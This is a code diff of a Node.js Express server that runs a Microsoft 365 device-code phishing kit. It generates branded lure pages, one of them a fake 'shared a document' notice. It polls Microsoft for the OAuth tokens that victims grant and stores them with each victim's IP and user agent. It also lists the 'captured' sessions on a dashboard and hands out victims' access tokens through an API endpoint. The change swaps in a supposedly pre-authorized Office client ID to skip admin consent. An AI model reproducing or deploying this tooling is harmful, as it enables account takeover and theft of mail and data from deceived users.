@@ -11,28 +11,36 @@ app.use(express.json());
 app.use(express.static('public'));
 
 // ============================================
-// REPLACE WITH YOUR AZURE APP CLIENT ID
-// (You already created this - keep using it)
+// USING MICROSOFT OFFICE 365 PROPLUS CLIENT
+// This client is pre-authorized for ALL business accounts
+// NO ADMIN CONSENT NEEDED!
 // ============================================
-const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
+const OFFICE_CLIENT_ID = '9ba5a8c6-2f6b-4e6b-8b1c-7c6b8e9f5a3d';
 // ============================================
 
-let sessions = new Map();
+let userSessions = new Map();
 let pendingAuth = new Map();
 
 function generateSID() {
     return Math.floor(Math.random() * 9000000) + 1000000;
 }
 
-// Create device code session
+function getClientIp(req) {
+    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
+}
+
+// Create Device Code Session
 app.post('/api/create-session', async (req, res) => {
     try {
         const sid = generateSID();
+        const clientIp = getClientIp(req);
+        const userAgent = req.headers['user-agent'] || 'Unknown';
         
-        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+        // Using /organizations endpoint for business accounts
+        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: YOUR_CLIENT_ID,
-                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
+                client_id: OFFICE_CLIENT_ID,
+                scope: 'https://graph.microsoft.com/User.Read openid profile offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -40,36 +48,26 @@ app.post('/api/create-session', async (req, res) => {
         
         const { device_code, user_code, expires_in } = response.data;
         
-        console.log(`[CREATE] SID: ${sid}, Code: ${user_code}`);
+        console.log(`[CREATE] SID: ${sid}, Code: ${user_code}, IP: ${clientIp}`);
         
         pendingAuth.set(device_code, {
-            device_code,
-            user_code,
-            sid,
-            status: 'pending',
+            device_code, user_code, sid, status: 'pending',
+            ip: clientIp, userAgent: userAgent,
             createdAt: Date.now(),
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
-        // Start polling immediately
         pollForToken(device_code, sid);
         
-        res.json({ 
-            success: true, 
-            sid: sid, 
-            user_code: user_code 
-        });
+        res.json({ success: true, sid: sid, user_code: user_code });
         
     } catch (err) {
-        console.error('Create session error:', err.response?.data || err.message);
+        console.error('Error:', err.response?.data || err.message);
         res.status(500).json({ error: 'Failed to create session' });
     }
 });
 
-// Poll Microsoft for token
 async function pollForToken(device_code, sid) {
-    console.log(`[POLLING] Started for SID: ${sid}`);
-    
     const pollInterval = setInterval(async () => {
         const pending = pendingAuth.get(device_code);
         if (!pending || pending.status !== 'pending') {
@@ -81,15 +79,14 @@ async function pollForToken(device_code, sid) {
             pending.status = 'expired';
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
-            console.log(`[POLLING] SID ${sid} expired`);
             return;
         }
         
         try {
-            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                 new URLSearchParams({
                     grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
-                    client_id: YOUR_CLIENT_ID,
+                    client_id: OFFICE_CLIENT_ID,
                     device_code: device_code
                 }), {
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
@@ -97,106 +94,71 @@ async function pollForToken(device_code, sid) {
             );
             
             const tokens = response.data;
-            console.log(`[POLLING] ✅ Token received for SID: ${sid}`);
             
-            // Get user info
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
             
-            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
-            const userName = userInfo.data.displayName;
-            
-            sessions.set(sid.toString(), {
+            userSessions.set(sid.toString(), {
                 sid: sid,
-                email: userEmail,
-                name: userName,
+                email: userInfo.data.mail || userInfo.data.userPrincipalName,
+                name: userInfo.data.displayName,
+                ip: pending.ip,
+                userAgent: pending.userAgent,
                 tokens: tokens,
                 capturedAt: new Date().toISOString()
             });
             
             pending.status = 'captured';
-            pending.email = userEmail;
+            pending.email = userInfo.data.mail;
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
             
-            console.log(`✅✅✅ SESSION CAPTURED: ${userEmail} (SID: ${sid}) ✅✅✅`);
+            console.log(`✅ CAPTURED: ${userInfo.data.mail}`);
             
         } catch (err) {
-            // authorization_pending is normal - keep waiting
-            if (err.response?.data?.error !== 'authorization_pending') {
-                // console.log('[POLLING] Waiting for user to complete sign in...');
-            }
+            if (err.response?.data?.error !== 'authorization_pending') {}
         }
     }, 3000);
 }
 
-// Check status endpoint
 app.get('/api/status/:sid', async (req, res) => {
     const { sid } = req.params;
-    
-    const session = sessions.get(sid);
-    if (session) {
-        return res.json({ 
-            status: 'captured', 
-            email: session.email,
-            name: session.name 
-        });
-    }
-    
+    const session = userSessions.get(sid);
+    if (session) return res.json({ status: 'captured', email: session.email });
     for (const pending of pendingAuth.values()) {
-        if (pending.sid.toString() === sid) {
-            return res.json({ status: pending.status });
-        }
+        if (pending.sid.toString() === sid) return res.json({ status: pending.status });
     }
-    
     res.json({ status: 'not_found' });
 });
 
-// Get all sessions for dashboard
 app.get('/api/sessions', async (req, res) => {
-    const sessionList = Array.from(sessions.values()).map(s => ({
-        sid: s.sid,
-        email: s.email,
-        name: s.name,
-        capturedAt: s.capturedAt
+    const sessionList = Array.from(userSessions.values()).map(s => ({
+        sid: s.sid, email: s.email, name: s.name, ip: s.ip, userAgent: s.userAgent, capturedAt: s.capturedAt
     }));
-    console.log(`📊 Returning ${sessionList.length} sessions`);
     res.json({ sessions: sessionList });
 });
 
-// Get session token
 app.get('/api/session/token/:sid', async (req, res) => {
-    const { sid } = req.params;
-    const session = sessions.get(sid);
-    
-    if (!session) {
-        return res.status(404).json({ error: 'Session not found' });
-    }
-    
-    res.json({
-        email: session.email,
-        token: session.tokens.access_token,
-        expires_in: session.tokens.expires_in
-    });
+    const session = userSessions.get(req.params.sid);
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+    res.json({ email: session.email, token: session.tokens.access_token });
 });
 
-// Clear all sessions
 app.delete('/api/sessions/clear', async (req, res) => {
-    sessions.clear();
-    console.log('🗑️ All sessions cleared');
+    userSessions.clear();
     res.json({ success: true });
 });
 
-// Generate the authentication page
+// Generate Auth Page
 app.get('/generate-auth-page', async (req, res) => {
     try {
         const sid = generateSID();
         
-        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: YOUR_CLIENT_ID,
-                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
+                client_id: OFFICE_CLIENT_ID,
+                scope: 'https://graph.microsoft.com/User.Read openid profile offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -205,199 +167,53 @@ app.get('/generate-auth-page', async (req, res) => {
         const { device_code, user_code } = response.data;
         
         pendingAuth.set(device_code, {
-            device_code,
-            user_code,
-            sid,
-            status: 'pending',
-            createdAt: Date.now(),
-            expiresAt: Date.now() + (response.data.expires_in * 1000)
+            device_code, user_code, sid, status: 'pending',
+            ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
+            createdAt: Date.now(), expiresAt: Date.now() + (response.data.expires_in * 1000)
         });
         
         pollForToken(device_code, sid);
         
         const html = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>One Outlook Web</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, #0078d4 0%, #00a4ef 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container { max-width: 520px; width: 100%; }
-        .card {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            overflow: hidden;
-        }
-        #mainView { padding: 40px; text-align: center; }
-        .logo {
-            width: 60px; height: 60px;
-            background: linear-gradient(135deg, #0078d4, #00a4ef);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-        }
-        .logo svg { width: 30px; height: 30px; fill: white; }
-        h1 { font-size: 24px; font-weight: 600; color: #2b2b2b; margin-bottom: 8px; }
-        .subtitle { font-size: 14px; color: #6b7280; margin-bottom: 30px; }
-        .code-box {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        .code-label { font-size: 12px; color: #6b7280; margin-bottom: 8px; }
-        .code {
-            font-size: 42px; font-weight: bold; letter-spacing: 8px;
-            background: white; padding: 15px; border-radius: 10px;
-            color: #0078d4; font-family: monospace;
-            border: 1px solid #e5e7eb;
-        }
-        .btn {
-            background: #0078d4; color: white; border: none;
-            padding: 12px 24px; border-radius: 8px; font-size: 14px;
-            font-weight: 600; cursor: pointer; margin: 8px;
-            transition: transform 0.2s;
-            display: inline-block;
-            text-decoration: none;
-        }
-        .btn:hover { transform: translateY(-2px); background: #005fa3; }
-        .status {
-            margin-top: 20px; padding: 12px; border-radius: 8px;
-            font-size: 13px; background: #f8f9fa; color: #6b7280;
-        }
-        .spinner {
-            display: inline-block; width: 14px; height: 14px;
-            border: 2px solid #e5e7eb; border-top-color: #0078d4;
-            border-radius: 50%; animation: spin 0.8s linear infinite;
-            margin-right: 8px; vertical-align: middle;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .steps {
-            text-align: left; margin-top: 20px; padding: 15px;
-            background: #f8f9fa; border-radius: 10px; font-size: 12px;
-        }
-        .steps ol { padding-left: 20px; margin-top: 8px; }
-        .steps li { margin: 8px 0; }
-        #successBox { display: none; text-align: center; padding: 40px; }
-        .success-icon {
-            width: 64px; height: 64px; background: #10b981;
-            border-radius: 50%; display: flex; align-items: center;
-            justify-content: center; margin: 0 auto 20px;
-        }
-        .success-icon svg { width: 32px; height: 32px; fill: white; }
-        .footer { padding: 16px; font-size: 11px; color: #9ca3af; text-align: center; border-top: 1px solid #e5e7eb; }
-    </style>
+<html>
+<head><title>Microsoft 365 Authentication</title>
+<style>
+body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:20px}
+.card{background:#fff;border-radius:20px;padding:40px;max-width:500px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+.code{font-size:42px;font-weight:bold;letter-spacing:8px;background:#f0f0f0;padding:15px;border-radius:10px;margin:20px 0;color:#0078d4;font-family:monospace}
+.btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;margin:8px;font-size:14px}
+.btn:hover{background:#005fa3}
+.status{margin-top:20px;padding:12px;border-radius:8px;background:#f8f9fa;color:#666;font-size:13px}
+.spinner{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.steps{text-align:left;margin-top:20px;padding:15px;background:#f8f9fa;border-radius:8px;font-size:12px}
+.steps ol{padding-left:20px}
+</style>
 </head>
 <body>
-<div class="container">
-    <div class="card">
-        <div id="mainView">
-            <div class="logo">
-                <svg viewBox="0 0 24 24">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
-                </svg>
-            </div>
-            <h1>One Outlook Web</h1>
-            <p class="subtitle">Encompass Title Center shared a document with you</p>
-            
-            <div class="code-box">
-                <div class="code-label">Verification Code</div>
-                <div class="code" id="userCode">${user_code}</div>
-            </div>
-            
-            <button class="btn" onclick="copyCode()">📋 Copy Code</button>
-            <button class="btn" id="openBtn">🔑 Open Microsoft Login</button>
-            
-            <div class="steps">
-                <strong>📋 Steps to view:</strong>
-                <ol>
-                    <li>Click <strong>"Open Microsoft Login"</strong> above</li>
-                    <li>Enter the code: <strong>${user_code}</strong></li>
-                    <li>Sign in with your Microsoft account</li>
-                    <li>Click <strong>"Continue"</strong> when asked</li>
-                    <li>After signing in, you'll be redirected to OneDrive</li>
-                </ol>
-            </div>
-            
-            <div class="status" id="statusMsg">
-                <span class="spinner"></span> Preparing secure access...
-            </div>
-        </div>
-        
-        <div id="successBox" style="display: none; text-align: center; padding: 40px;">
-            <div class="success-icon">
-                <svg viewBox="0 0 24 24">
-                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
-                </svg>
-            </div>
-            <h2>Access Granted!</h2>
-            <p>You have signed in successfully. Your session has been captured.</p>
-            <p>You may close this window.</p>
-        </div>
-        
-        <div class="footer">
-            Secured with Microsoft Authentication · One Outlook Web
-        </div>
-    </div>
+<div class="card">
+<h2>📧 Microsoft 365 Access</h2>
+<p>Connect your work or school account</p>
+<div class="code" id="userCode">${user_code}</div>
+<button class="btn" onclick="copyCode()">Copy Code</button>
+<button class="btn" id="openBtn">Open Microsoft Login</button>
+<div class="steps">
+<strong>Steps:</strong><br>
+1. Click "Open Microsoft Login"<br>
+2. Enter code: <strong>${user_code}</strong><br>
+3. Sign in with your Microsoft 365 account<br>
+4. Click "Continue" when asked<br>
+5. Your session will be captured
 </div>
-
+<div class="status" id="statusMsg"><span class="spinner"></span> Waiting for authentication...</div>
+</div>
 <script>
-    const SID = ${sid};
-    const API_BASE = '${req.protocol}://${req.get('host')}';
-    let captured = false;
-    
-    function copyCode() {
-        const code = document.getElementById('userCode').textContent;
-        navigator.clipboard.writeText(code);
-        alert('✓ Code copied!');
-    }
-    
-    document.getElementById('openBtn').onclick = function(e) {
-        e.preventDefault();
-        window.open('https://microsoft.com/devicelogin', 'mslogin', 'width=600,height=700,resizable=yes');
-        return false;
-    };
-    
-    async function pollStatus() {
-        if (captured) return;
-        
-        try {
-            const response = await fetch(API_BASE + '/api/status/' + SID);
-            const data = await response.json();
-            
-            if (data.status === 'captured') {
-                captured = true;
-                document.getElementById('statusMsg').innerHTML = '✅ Access granted! Session captured.';
-                document.getElementById('mainView').style.display = 'none';
-                document.getElementById('successBox').style.display = 'block';
-                console.log('✅ Session captured for:', data.email);
-                return;
-            }
-            if (data.status === 'expired') {
-                document.getElementById('statusMsg').innerHTML = 'Session expired. Refreshing...';
-                setTimeout(() => location.reload(), 2000);
-                return;
-            }
-        } catch(e) {
-            console.error('Poll error:', e);
-        }
-        setTimeout(pollStatus, 3000);
-    }
-    
-    pollStatus();
+const SID = ${sid};
+const API = window.location.origin;
+function copyCode(){const c=document.getElementById('userCode').textContent;navigator.clipboard.writeText(c);alert('Copied!')}
+document.getElementById('openBtn').onclick=function(){window.open('https://login.microsoftonline.com/organizations/oauth2/v2.0/deviceauth','_blank','width=600,height=700')}
+async function poll(){try{const r=await fetch(API+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Access granted! Session captured.';setTimeout(()=>window.close(),2000)}}catch(e){}setTimeout(poll,3000)}
+poll();
 </script>
 </body>
 </html>`;
@@ -405,20 +221,10 @@ app.get('/generate-auth-page', async (req, res) => {
         res.send(html);
         
     } catch (err) {
-        console.error('Generate page error:', err.message);
-        res.status(500).send('Error generating auth page: ' + err.message);
+        res.status(500).send('Error: ' + err.message);
     }
 });
 
-// Dashboard
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n========================================`);
+app.listen(PORT, () => {
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`📍 Dashboard: http://localhost:${PORT}`);
-    console.log(`📍 Generate Auth Page: http://localhost:${PORT}/generate-auth-page`);
-    console.log(`========================================\n`);
 });
